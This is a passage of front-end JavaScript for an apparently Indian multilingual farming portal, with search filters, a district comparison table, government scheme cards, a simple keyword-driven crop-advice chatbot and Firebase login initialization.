                } else {
                    card.style.display = 'none';
                }
            });
            document.getElementById('stateSearchCount').textContent = `${translations[currentLanguage]['showing_states']} ${count} ${translations[currentLanguage]['of']} ${cards.length}`;
            if (clearState) clearState.style.display = term ? 'block' : 'none';
        });
    }
    if (clearState) {
        clearState.addEventListener('click', function () {
            stateSearch.value = '';
            stateSearch.dispatchEvent(new Event('input'));
            this.style.display = 'none';
        });
    }

    const districtSearch = document.getElementById('districtSearchInput');
    const clearDistrict = document.getElementById('clearDistrictSearch');
    if (districtSearch) {
        districtSearch.addEventListener('input', function () {
            const term = this.value.toLowerCase();
            const cards = document.querySelectorAll('#districtsGrid .district-card');
            let count = 0;
            cards.forEach(card => {
                const name = card.querySelector('.district-name')?.textContent.toLowerCase() || '';
                if (name.includes(term)) {
                    card.style.display = 'block';
                    count++;
                } else {
                    card.style.display = 'none';
                }
            });
            document.getElementById('districtSearchCount').textContent = `${translations[currentLanguage]['showing_districts']} ${count}`;
            if (clearDistrict) clearDistrict.style.display = term ? 'block' : 'none';
        });
    }
    if (clearDistrict) {
        clearDistrict.addEventListener('click', function () {
            districtSearch.value = '';
            districtSearch.dispatchEvent(new Event('input'));
            this.style.display = 'none';
        });
    }
}

// ============================================
// GOVERNMENT SCHEMES
// ============================================
function loadGovernmentSchemes() {
    const container = document.getElementById('schemesGrid');
    if (!container) return;
    container.innerHTML = '';
    governmentSchemesData.forEach(scheme => {
        const card = document.createElement('div');
        card.className = 'district-card';
        card.innerHTML = `
            <div class="district-icon"><i class="fas fa-hand-holding-usd"></i></div>
            <div class="district-name">${scheme.title[currentLanguage]}</div>
            <div class="district-crops">${scheme.description[currentLanguage]}</div>
            <div class="district-crops"><strong>${translations[currentLanguage]['benefits']}:</strong> ${scheme.benefits[currentLanguage]}</div>
            <button class="btn btn-primary" style="margin-top: 15px;" onclick="alert('${translations[currentLanguage]['apply_clicked']}')">
                <i class="fas fa-file-alt"></i> ${translations[currentLanguage]['btn_apply']}
            </button>
        `;
        container.appendChild(card);
    });

    const schemeSearch = document.getElementById('schemeSearchInput');
    const clearScheme = document.getElementById('clearSchemeSearch');
    if (schemeSearch) {
        schemeSearch.addEventListener('input', function () {
            const term = this.value.toLowerCase();
            const cards = container.querySelectorAll('.district-card');
            let count = 0;
            cards.forEach(card => {
                const name = card.querySelector('.district-name')?.textContent.toLowerCase() || '';
                if (name.includes(term)) {
                    card.style.display = 'block';
                    count++;
                } else {
                    card.style.display = 'none';
                }
            });
            document.getElementById('schemeSearchCount').textContent = `${translations[currentLanguage]['showing_schemes']} ${count}`;
            if (clearScheme) clearScheme.style.display = term ? 'block' : 'none';
        });
    }
    if (clearScheme) {
        clearScheme.addEventListener('click', function () {
            schemeSearch.value = '';
            schemeSearch.dispatchEvent(new Event('input'));
            this.style.display = 'none';
        });
    }
}

// ============================================
// DISTRICT COMPARISON
// ============================================
function setupDistrictComparison() {
    const container = document.getElementById('comparisonContent');
    if (!container) return;

    let districtOptions = '';
    statesData.forEach(state => {
        state.districts.forEach(d => {
            districtOptions += `<option value="${state.id}-${d.id}">${d.name[currentLanguage]}, ${state.name[currentLanguage]}</option>`;
        });
    });

    container.innerHTML = `
        <div class="district-details">
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px;">
                ${[1, 2, 3].map(num => `
                    <div style="background: #f9f9f9; border-radius: 10px; padding: 20px;">
                        <h4 style="color: var(--dark-green); margin-bottom: 15px;"><i class="fas fa-map-marker-alt"></i> ${translations[currentLanguage]['select_district']} ${num}</h4>
                        <select class="form-select" style="width: 100%; margin-bottom: 10px;" id="compareDistrictSelect${num}">
                            <option value="">${translations[currentLanguage]['select_district']}</option>
                            ${districtOptions}
                        </select>
                        <div id="compareDistrictInfo${num}" style="min-height: 100px; padding: 10px; background: white; border-radius: 8px;">
                            <div style="color: var(--text-light); font-style: italic; text-align: center; padding: 20px;">${translations[currentLanguage]['no_district_selected']}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
            <button class="btn btn-primary" onclick="runDistrictComparison()" style="width: 100%; padding: 15px; font-size: 1.1rem;">
                <i class="fas fa-chart-bar"></i> ${translations[currentLanguage]['btn_compare']}
            </button>
            <div id="districtComparisonResults" style="margin-top: 30px; display: none;"></div>
        </div>
    `;

    for (let i = 1; i <= 3; i++) {
        document.getElementById(`compareDistrictSelect${i}`)?.addEventListener('change', function () {
            updateCompareDistrictDisplay(i, this.value);
        });
    }
}

function updateCompareDistrictDisplay(selectorNum, value) {
    const container = document.getElementById(`compareDistrictInfo${selectorNum}`);
    if (!value) {
        container.innerHTML = `<div style="color: var(--text-light); font-style: italic; text-align: center; padding: 20px;">${translations[currentLanguage]['no_district_selected']}</div>`;
        return;
    }
    const [stateId, districtId] = value.split('-');
    const state = statesData.find(s => s.id === stateId);
    const district = state.districts.find(d => d.id === districtId);
    const districtInfo = districtInfoData[districtId];
    container.innerHTML = `
        <div>
            <h5 style="color: var(--dark-green); margin-bottom: 5px;">${district.name[currentLanguage]}</h5>
            <p style="color: var(--text-light); font-size: 0.9rem; margin-bottom: 10px;">${state.name[currentLanguage]}</p>
            <div style="display: flex; gap: 5px; flex-wrap: wrap; margin-bottom: 10px;">
                <span class="tag ${getDemandClass(districtInfo.demand.en)}">${translations[currentLanguage]['market_demand']}: ${districtInfo.demand[currentLanguage]}</span>
                <span class="tag ${getRiskClass(districtInfo.risk.en)}">${translations[currentLanguage]['risk_level']}: ${districtInfo.risk[currentLanguage]}</span>
            </div>
            <p style="color: var(--text-light); font-size: 0.9rem;">
                <strong>${translations[currentLanguage]['top_crops']}:</strong> ${district.crops[currentLanguage]}<br>
                <strong>${translations[currentLanguage]['season']}:</strong> ${district.season[currentLanguage]}
            </p>
        </div>
    `;
}

function runDistrictComparison() {
    const selected = [];
    for (let i = 1; i <= 3; i++) {
        const select = document.getElementById(`compareDistrictSelect${i}`);
        const value = select?.value;
        if (value) {
            const [stateId, districtId] = value.split('-');
            const state = statesData.find(s => s.id === stateId);
            const district = state.districts.find(d => d.id === districtId);
            selected.push({ state, district });
        }
    }
    if (selected.length < 2) {
        alert(translations[currentLanguage]['alert_select_two_districts']);
        return;
    }

    const resultsContainer = document.getElementById('districtComparisonResults');
    resultsContainer.style.display = 'block';

    let tableRows = '';
    const features = ['top_crops', 'season', 'market_demand', 'risk_level', 'export_potential'];

    features.forEach(feature => {
        let row = `<tr><td><strong>${translations[currentLanguage][feature] || feature}</strong></td>`;
        selected.forEach(item => {
            const info = districtInfoData[item.district.id];
            let value = '';
            if (feature === 'top_crops') value = item.district.crops[currentLanguage];
            else if (feature === 'season') value = item.district.season[currentLanguage];
            else if (feature === 'market_demand') value = `<span class="tag ${getDemandClass(info.demand.en)}">${info.demand[currentLanguage]}</span>`;
            else if (feature === 'risk_level') value = `<span class="tag ${getRiskClass(info.risk.en)}">${info.risk[currentLanguage]}</span>`;
            else if (feature === 'export_potential') value = `<span class="tag ${getExportClass(info.exportPotential.en)}">${info.exportPotential[currentLanguage]}</span>`;
            row += `<td style="text-align: center;">${value}</td>`;
        });
        row += `</tr>`;
        tableRows += row;
    });

    resultsContainer.innerHTML = `
        <h3 style="color: var(--dark-green); margin-bottom: 20px;"><i class="fas fa-chart-pie"></i> ${translations[currentLanguage]['comparison_results']}</h3>
        <div style="overflow-x: auto;">
            <table class="info-table">
                <thead><tr><th>${translations[currentLanguage]['feature']}</th>${selected.map(item =>
        `<th style="text-align: center; background: linear-gradient(to bottom, var(--light-green), var(--primary-green)); color: white;">
                        ${item.district.name[currentLanguage]}<br><small>${item.state.name[currentLanguage]}</small>
                    </th>`).join('')}</tr></thead>
                <tbody>
                    ${tableRows}
                </tbody>
            </table>
        </div>
        <div style="margin-top: 20px; padding: 20px; background: #fff8e1; border-radius: 10px;">
            <h4 style="color: var(--dark-green); margin-bottom: 10px;"><i class="fas fa-lightbulb"></i> ${translations[currentLanguage]['recommendation']}</h4>
            <p style="color: var(--text-dark);">
                <strong>${selected[0].district.name[currentLanguage]}</strong> ${translations[currentLanguage]['best_opportunity']}
            </p>
        </div>
    `;
}

// ============================================
// CHATBOT FUNCTIONS
// ============================================
function toggleChatbot() {
    const win = document.getElementById('chatbotWindow');
    const btn = document.getElementById('openChatbot');
    if (win.style.display === 'flex') {
        win.style.display = 'none';
        btn.innerHTML = '<i class="fas fa-female" style="color: white;"></i>';
        chatbotMode = null;
    } else {
        win.style.display = 'flex';
        btn.innerHTML = '<i class="fas fa-times"></i>';
    }
}

function sendChatbotMessage() {
    const input = document.getElementById('chatbotInput');
    const msg = input.value.trim();
    if (!msg) return;
    addChatMessage(msg, 'user');
    input.value = '';
    setTimeout(() => processChatbotMessage(msg), 500);
}

function processChatbotMessage(msg) {
    const lower = msg.toLowerCase();
    if (chatbotMode === 'district') {
        searchAndNavigateToDistrict(msg);
        chatbotMode = null;
        return;
    } else if (chatbotMode === 'crop_advice') {
        provideCropAdvice(msg);
        chatbotMode = null;
        return;
    } else if (chatbotMode === 'prices') {
        provideCropPrice(msg);
        chatbotMode = null;
        return;
    } else if (chatbotMode === 'problem') {
        provideProblemSolution(msg);
        chatbotMode = null;
        return;
    }
    if (lower.includes('hi') || lower.includes('hello') || lower.includes('namaste')) {
        addChatMessage(chatbotResponses[currentLanguage]['hi'], 'bot');
    } else if (lower.includes('district') || lower.includes('jilla') || lower.includes('जिल्हा') || lower.includes('जिला')) {
        addChatMessage(chatbotResponses[currentLanguage]['district'], 'bot');
        chatbotMode = 'district';
    } else if (lower.includes('calculator') || lower.includes('profit') || lower.includes('नफा')) {
        addChatMessage(chatbotResponses[currentLanguage]['calculator'], 'bot');
        setTimeout(() => showPage('calculator'), 1000);
    } else if (lower.includes('scheme') || lower.includes('yojana') || lower.includes('योजना')) {
        addChatMessage(chatbotResponses[currentLanguage]['schemes'], 'bot');
        setTimeout(() => showPage('governmentSchemes'), 1000);
    } else if (lower.includes('crop') || lower.includes('advice') || lower.includes('पीक') || lower.includes('सल्ला')) {
        addChatMessage(chatbotResponses[currentLanguage]['crop_advice'], 'bot');
        chatbotMode = 'crop_advice';
    } else if (lower.includes('tip') || lower.includes('टिप्स')) {
        addChatMessage(chatbotResponses[currentLanguage]['tips'], 'bot');
    } else if (lower.includes('price') || lower.includes('rate') || lower.includes('भाव')) {
        addChatMessage(chatbotResponses[currentLanguage]['prices'], 'bot');
        chatbotMode = 'prices';
    } else if (lower.includes('problem') || lower.includes('issue') || lower.includes('समस्या')) {
        addChatMessage(chatbotResponses[currentLanguage]['problem'], 'bot');
        chatbotMode = 'problem';
    } else {
        addChatMessage(chatbotResponses[currentLanguage]['default'], 'bot');
    }
}

function handleChatbotFeature(feature) {
    let response = '';
    switch (feature) {
        case 'district': response = chatbotResponses[currentLanguage]['district']; chatbotMode = 'district'; break;
        case 'calculator': response = chatbotResponses[currentLanguage]['calculator']; setTimeout(() => showPage('calculator'), 1000); break;
        case 'schemes': response = chatbotResponses[currentLanguage]['schemes']; setTimeout(() => showPage('governmentSchemes'), 1000); break;
        case 'crop_advice': response = chatbotResponses[currentLanguage]['crop_advice']; chatbotMode = 'crop_advice'; break;
        case 'tips': response = chatbotResponses[currentLanguage]['tips']; break;
        case 'prices': response = chatbotResponses[currentLanguage]['prices']; chatbotMode = 'prices'; break;
        case 'problem': response = chatbotResponses[currentLanguage]['problem']; chatbotMode = 'problem'; break;
    }
    addChatMessage(response, 'bot');
}

function searchAndNavigateToDistrict(name) {
    let found = null, foundState = null;
    for (const state of statesData) {
        for (const d of state.districts) {
            if (d.name[currentLanguage].toLowerCase().includes(name.toLowerCase())) {
                found = d; foundState = state; break;
            }
        } if (found) break;
    }
    if (found && foundState) {
        addChatMessage(`${translations[currentLanguage]['searching']} ${found.name[currentLanguage]}...`, 'bot');
        setTimeout(() => {
            selectDistrict(foundState.id, found.id);
            addChatMessage(`${translations[currentLanguage]['taking_to']} ${found.name[currentLanguage]} ${translations[currentLanguage]['district_page']}`, 'bot');
            toggleChatbot();
        }, 1500);
    } else {
        addChatMessage(`${translations[currentLanguage]['not_found']} "${name}" ${translations[currentLanguage]['district']}. ${translations[currentLanguage]['try_again']}`, 'bot');
    }
}

function provideCropAdvice(name) {
    const key = Object.keys(cropData).find(k =>
        name.toLowerCase().includes(k.toLowerCase()) ||
        translations[currentLanguage][`crop_${k.toLowerCase()}`]?.toLowerCase().includes(name.toLowerCase())
    );
    if (key) {
        const crop = cropData[key];
        const translatedCropName = translations[currentLanguage][`crop_${key.toLowerCase()}`] || key;
        addChatMessage(`<div class="crop-advice-box"><div class="advice-title">${translatedCropName} ${translations[currentLanguage]['advice']}</div><strong>${translations[currentLanguage]['season']}:</strong> ${crop.season}<br><strong>${translations[currentLanguage]['cultivation_advice']}:</strong> ${crop.advice}</div>`, 'bot');
    } else {
        addChatMessage(`${translations[currentLanguage]['crop_not_found']} "${name}" ${translations[currentLanguage]['crop_info']}. ${translations[currentLanguage]['try_again']}`, 'bot');
    }
}

function provideCropPrice(name) {
    const key = Object.keys(cropData).find(k =>
        name.toLowerCase().includes(k.toLowerCase()) ||
        translations[currentLanguage][`crop_${k.toLowerCase()}`]?.toLowerCase().includes(name.toLowerCase())
    );
    if (key) {
        const crop = cropData[key];
        const translatedCropName = translations[currentLanguage][`crop_${key.toLowerCase()}`] || key;
        addChatMessage(`<div class="crop-price-display"><div class="price-crop">${translatedCropName}</div><div class="price-value">₹${formatNumber(crop.pricePerTon)}</div><div class="price-unit">${translations[currentLanguage]['per_ton']}</div></div>`, 'bot');
    } else {
        addChatMessage(`${translations[currentLanguage]['crop_not_found']} "${name}" ${translations[currentLanguage]['price_info']}. ${translations[currentLanguage]['try_again']}`, 'bot');
    }
}

function provideProblemSolution(desc) {
    let solution = null, crop = null;
    for (const [c, data] of Object.entries(cropData)) {
        for (const [p, s] of Object.entries(data.problems)) {
            if (desc.toLowerCase().includes(p.toLowerCase())) {
                solution = s; crop = c; break;
            }
        } if (solution) break;
    }
    if (solution && crop) {
        const translatedCropName = translations[currentLanguage][`crop_${crop.toLowerCase()}`] || crop;
        addChatMessage(`<div class="problem-solution"><div class="solution-title">${translatedCropName} ${translations[currentLanguage]['problem_solution']}</div><div class="solution-steps"><li>${solution}</li><li>${translations[currentLanguage]['consult_expert']}</li><li>${translations[currentLanguage]['contact_officer']}</li></div></div>`, 'bot');
    } else {
        addChatMessage(`${translations[currentLanguage]['solution_not_found']} ${translations[currentLanguage]['contact_officer']}`, 'bot');
    }
}

function addChatMessage(msg, sender) {
    const body = document.getElementById('chatbotBody');
    const div = document.createElement('div');
    div.className = `chat-message ${sender}-message`;
    if (sender === 'bot' && msg.includes('<div')) div.innerHTML = msg;
    else div.textContent = msg;
    body.appendChild(div);
    body.scrollTop = body.scrollHeight;
}

function updateChatbotWelcome() {
    const welcome = document.querySelector('.chatbot-body .bot-message span');
    if (welcome) welcome.textContent = translations[currentLanguage]['chat_welcome'];
}

function updateChatbotFeatures() {
    const container = document.getElementById('chatbotFeaturesList');
    if (!container) return;
    container.innerHTML = '';
    const features = [
        { num: 1, text: { en: "Search District - Type district name and go directly to that district's page", mr: "जिल्हा शोधा - जिल्ह्याचे नाव टाईप करा आणि थेट त्या जिल्ह्याच्या पृष्ठावर जा", hi: "जिला खोजें - जिले का नाम टाइप करें और सीधे उस जिले के पृष्ठ पर जाएं" }, feat: 'district' },
        { num: 2, text: { en: "Open Calculator - Go directly to Profit Calculator page", mr: "कॅल्क्युलेटर उघडा - थेट नफा कॅल्क्युलेटर पृष्ठावर जा", hi: "कैलकुलेटर खोलें - सीधे लाभ कैलकुलेटर पृष्ठ पर जाएं" }, feat: 'calculator' },
        { num: 3, text: { en: "Government Schemes - View all schemes for farmers", mr: "सरकारी योजना - शेतकऱ्यांसाठी सर्व योजना पहा", hi: "सरकारी योजनाएं - किसानों के लिए सभी योजनाएं देखें" }, feat: 'schemes' },
        { num: 4, text: { en: "Crop Advice - Type crop name, I'll provide season and cultivation advice", mr: "पीक सल्ला - पिकाचे नाव टाईप करा, मी हंगाम आणि शेती सल्ला देईन", hi: "फसल सलाह - फसल का नाम टाइप करें, मैं मौसम और खेती सलाह दूंगी" }, feat: 'crop_advice' },
        { num: 5, text: { en: "Quick Tips - Get tips for better farming", mr: "जलद टिप्स - उत्तम शेतीसाठी टिप्स मिळवा", hi: "त्वरित टिप्स - बेहतर खेती के लिए टिप्स प्राप्त करें" }, feat: 'tips' },
        { num: 6, text: { en: "Market Prices - Type crop name, get price per ton", mr: "बाजारभाव - पिकाचे नाव टाईप करा, प्रति टन भाव मिळवा", hi: "बाजार मूल्य - फसल का नाम टाइप करें, प्रति टन मूल्य प्राप्त करें" }, feat: 'prices' },
        { num: 7, text: { en: "Problem Solver - Get solutions for crop problems", mr: "समस्या सोडवणारा - पीक समस्यांसाठी उपाय मिळवा", hi: "समस्या समाधान - फसल समस्याओं के लिए समाधान प्राप्त करें" }, feat: 'problem' }
    ];
    features.forEach(f => {
        const item = document.createElement('div');
        item.className = 'feature-item';
        item.onclick = () => handleChatbotFeature(f.feat);
        const parts = f.text[currentLanguage].split(' - ');
        item.innerHTML = `<div class="feature-number">${f.num}</div><div class="feature-text">${parts.length > 1 ? `<strong>${parts[0]}</strong> - ${parts[1]}` : f.text[currentLanguage]}</div>`;
        container.appendChild(item);
    });
}

// ============================================
// INITIALIZATION
// ============================================
document.addEventListener('DOMContentLoaded', function () {
    changeLanguage('mr');
    changeLoginLanguage('mr');

    document.getElementById('mainApp').classList.remove('authenticated');
    document.getElementById('loginPage').style.display = 'flex';

    updateChatbotFeatures();

    // Check if user is already logged in
    firebase.auth().onAuthStateChanged((user) => {
        if (user) {
            // User is signed in
            showAuthenticatedState(user);
        }
    });
});